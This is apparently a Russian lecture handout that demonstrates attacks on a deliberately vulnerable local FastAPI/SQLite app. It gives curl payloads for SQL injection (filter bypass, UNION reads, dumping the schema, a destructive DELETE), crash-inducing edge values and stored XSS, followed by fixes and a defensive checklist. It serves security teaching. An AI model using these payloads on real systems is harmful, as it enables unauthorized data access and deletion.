# PAYLOADS.md — Проверенные эксплойты (демо для лекции)

> Все payload'ы **проверены вживую** на учебном полигоне:
> FastAPI CRUD + SQLite → `http://127.0.0.1:8000` (репо ozyab09/fast-api-audit).
> Уязвимость: SQL-инъекция в `GET /search?q=` (запрос собран f-string'ом).
> Атаковать можно только **свой** локальный полигон. Это учебный материал.

---

## 🔴 SQL-инъекция: цепочка от простого к сложному

### Шаг 0. Легитимный запрос (что видит开发者)

```bash
curl "http://127.0.0.1:8000/search?q=Laptop"
# → [{"id":1,"name":"Laptop Pro",...}]
```

### Шаг 1. Обход фильтра — вернуть ВСЕ записи

```bash
curl "http://127.0.0.1:8000/search?q=%27%20OR%20%271%27%3D%271"
# q = ' OR '1'='1
# → возвращает все товары БД (фильтр проигнорирован)
```

### Шаг 2. UNION-инъекция — чтение произвольных данных

```bash
curl "http://127.0.0.1:8000/search?q=%27%20UNION%20SELECT%201,name,price,1,1%20FROM%20items%20--"
# q = ' UNION SELECT 1,name,price,1,1 FROM items --
# → SQLite выполняет вторую SELECT — читаем данные, которые не должны быть видны
```

### Шаг 3. Эксфильтрация схемы БД (самое опасное)

```bash
curl "http://127.0.0.1:8000/search?q=%27%20UNION%20SELECT%20name,sql,1,1,1%20FROM%20sqlite_master%20--"
# → злоумышленник получает полную структуру БД:
#   CREATE TABLE items (id INTEGER PRIMARY KEY..., name TEXT...)
#   CREATE TABLE sqlite_sequence(name,seq)
# Дальше он знает, какие таблицы атаковать.
```

### Шаг 4. Деструктивная операция (DELETE)

```bash
curl "http://127.0.0.1:8000/search?q=%27;%20DELETE%20FROM%20items;%20--"
# → Internal Server Error (500): sqlite3 API блокирует multi-statement,
#   но точка входа для модификации/удаления открыта.
#   В других БД (PostgreSQL через psycopg2) это выполнится.
```

### Почему это так легко? (вывод для лекции)
- Одна строка `f"SELECT ... WHERE name LIKE '%{q}%'"` — и вся БД открыта.
- ИИ генерирует эти payload'ы за секунды, если знает структуру запроса.
- Параметризованный запрос закрывает всю цепочку разом:

```python
def search_items(q: str):
    like = f"%{q}%"
    with get_db() as conn:
        cur = conn.execute(
            "SELECT * FROM items WHERE name LIKE ? OR description LIKE ?",
            (like, like),
        )
        return [row_to_dict(r) for r in cur.fetchall()]
```

---

## 🟠 HTTP 500 на граничные значения (CWE-248)

### Переполнение id

```bash
curl "http://127.0.0.1:8000/items/99999999999999999999999999"
# → Internal Server Error (500) вместо 404/422
```

### NaN-цена

```bash
curl -X POST http://127.0.0.1:8000/items -H "Content-Type: application/json" \
  -d '{"name":"NaNTest","price":NaN}'
# → Internal Server Error (500) вместо 422
# в логе: ValueError: Out of range float values are not JSON compliant: nan
```

### Вывод для лекции
- 500-ки = злоумышленнику сигналы о внутреннем устройстве + шум в логах + DoS-вектор.
- ИИ отлично генерирует такие граничные значения (фаззинг) — см. `demo_ai_fuzz.py`.

---

## 🟡 Хранимый XSS (CWE-79)

```bash
curl -X POST http://127.0.0.1:8000/items -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>","price":1.0}'
# → 201 Created, имя сохранено как есть
curl "http://127.0.0.1:8000/search?q=script"
# → [{"id":4,"name":"<script>alert(1)</script>",...}] — отдаётся без экранирования
```

### Вывод для лекции
- Если фронтенд рендерит `name` как HTML — выполнится произвольный JS.
- API должен санитизировать вход; фронтенд — экранировать вывод.

---

## 🛡️ Чек-лист защиты (вывод всей лекции)

| Уязвимость | Защита |
|-----------|--------|
| SQL-инъекция | Параметризованные запросы / ORM. Никогда f-string в SQL |
| XSS | Санитизация входа + экранирование вывода (bleach, CSP) |
| 500-ки/NaN | Валидация Pydantic `allow_inf_nan=False`, глобальный exception-handler |
| Нет аутентификации | OAuth2/JWT/API-key, роли, владелец ресурса |
| CORS `*` + credentials | Явный allowlist origins, без credentials для `*` |
| Открытый /docs | В проде `docs_url=None, redoc_url=None, openapi_url=None` |
| Нет security-заголовков | Middleware: `X-Content-Type-Options`, `CSP`, `X-Frame-Options`, HSTS |
| Нет rate limiting | slowapi / limits, таймауты, жёсткая пагинация |